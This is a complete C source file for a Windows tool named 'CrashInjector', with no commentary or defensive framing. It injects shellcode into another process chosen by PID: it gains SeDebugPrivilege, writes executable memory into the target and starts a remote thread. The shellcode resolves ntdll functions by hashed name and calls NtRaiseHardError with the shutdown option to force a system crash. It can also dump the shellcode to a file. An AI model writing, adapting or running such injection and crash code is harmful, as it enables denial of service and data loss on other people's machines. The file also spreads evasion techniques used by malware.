#include <stdio.h>
#include <Windows.h>
#include "ntdll.h"

typedef enum _HARDERROR_RESPONSE_OPTION
{
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
}HARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE
{
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes,
    ResponseTryAgain,
    ResponseContinue
}HARDERROR_RESPONSE;

typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ValidResponseOptions,
    PULONG Response
);

typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(ULONG Privilege,BOOLEAN Enable,BOOLEAN CurrentThread,PBOOLEAN OldValue);

void WINAPI ShellcodeProc()
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_EXPORT_DIRECTORY pIED;
	
	PPEB Peb;
	PLDR_DATA_TABLE_ENTRY Ldr;

	PVOID NtdllBase;

	PULONG Function,Name;
	PUSHORT Ordinal;

	ULONG i,Hash,Response;
	PUCHAR ptr;

	BOOLEAN bl;

	pNtRaiseHardError fnNtRaiseHardError=NULL;
	pRtlAdjustPrivilege fnRtlAdjustPrivilege=NULL;

	Peb=NtCurrentPeb();
	Ldr=CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink);

	Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink);
	NtdllBase=Ldr->DllBase;

	pIDH=(PIMAGE_DOS_HEADER)NtdllBase;
	pINH=(PIMAGE_NT_HEADERS)((PUCHAR)NtdllBase+pIDH->e_lfanew);

	pIED=(PIMAGE_EXPORT_DIRECTORY)((PUCHAR)NtdllBase+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	Function=(PULONG)((PUCHAR)NtdllBase+pIED->AddressOfFunctions);
	Name=(PULONG)((PUCHAR)NtdllBase+pIED->AddressOfNames);

	Ordinal=(PUSHORT)((PUCHAR)NtdllBase+pIED->AddressOfNameOrdinals);

	for(i=0;i<pIED->NumberOfNames;i++)
	{
		ptr=(PUCHAR)NtdllBase+Name[i];
		Hash=0;

		while(*ptr)
	    {
		    Hash=((Hash<<8)+Hash+*ptr)^(*ptr<<16);
		    ptr++;
	    }

		if(Hash==0x602b783f)
		{
			fnNtRaiseHardError=(pNtRaiseHardError)((PUCHAR)NtdllBase+Function[Ordinal[i]]);
		}

		if(Hash==0xb411bb44)
		{
			fnRtlAdjustPrivilege=(pRtlAdjustPrivilege)((PUCHAR)NtdllBase+Function[Ordinal[i]]);
		}
	}

	if(fnNtRaiseHardError && fnRtlAdjustPrivilege)
	{
		fnRtlAdjustPrivilege(19,TRUE,FALSE,&bl);
		fnNtRaiseHardError(0xC000026A,0,0,NULL,OptionShutdownSystem,&Response);
	}
}

void WINAPI CodeEnd()
{
	return;
}

int main(int argc,char* argv[])
{
	HANDLE hProcess,hThread,hFile;

	PVOID mem=NULL;
	ULONG CodeSize=(ULONG)CodeEnd-(ULONG)ShellcodeProc,size=4096,write;

	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;

	NTSTATUS status;
	BOOLEAN bl;
	
	if(argc<3)
	{
		printf("\nUsage:\n");

		printf("\nCrashInjector /inject [PID]\n");
		printf("Inject the shellcode into process\n");

		printf("\nCrashInjector /dump [Path]\n");
		printf("Dump the shellcode into file\n");

		return -1;
	}

	if(!stricmp(argv[1],"/inject"))
	{
		RtlAdjustPrivilege(20,TRUE,FALSE,&bl); // Enable SeDebugPrivilege
		
		cid.UniqueProcess=(HANDLE)atoi(argv[2]);
		cid.UniqueThread=NULL;

		InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);
		
		status=NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&cid);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to open target process (%#x)\n",status);
			return -1;
		}

		status=NtAllocateVirtualMemory(hProcess,&mem,0,&size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to allocate memory in target process (%#x)\n",status);

			NtClose(hProcess);
			return -1;
		}

		printf("\nMemory allocated at %#x\n",mem);
		printf("\nShellcode size: %u bytes\n",CodeSize);

		status=NtWriteVirtualMemory(hProcess,mem,ShellcodeProc,CodeSize,NULL);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to write the shellcode into target process (%#x)\n",status);
			size=0;

			NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
			NtClose(hProcess);

			return -1;
		}

		status=RtlCreateUserThread(hProcess,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)mem,NULL,&hThread,NULL);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to create remote thread in target process (%#x)\n",status);
			size=0;

			NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
			NtClose(hProcess);

			return -1;
		}

		printf("\nThread created\n");
		printf("\nWaiting for thread to terminate\n");

		NtWaitForSingleObject(hThread,FALSE,NULL);
		printf("\nThread terminated\n");

		NtClose(hThread);
		size=0;

		NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
		NtClose(hProcess);

		return 0;
	}

	else if(!stricmp(argv[1],"/dump"))
	{
		hFile=CreateFile(argv[2],GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,0,NULL); // Create the file

		if(hFile==INVALID_HANDLE_VALUE)
		{
			printf("\nError: Unable to create file (%u)\n",GetLastError());
			return -1;
		}

		if(!WriteFile(hFile,ShellcodeProc,CodeSize,&write,NULL)) // Write the shellcode into file
		{
			printf("\nError: Unable to write file (%u)\n",GetLastError());

			NtClose(hFile);
			return -1;
		}

		printf("\nShellcode successfully dumped\n");
		printf("Shellcode size: %u bytes\n",CodeSize);

		NtClose(hFile);
	}

	else
	{
		printf("\nError: Invalid arguments\n");
		return -1;
	}

	return 0;
}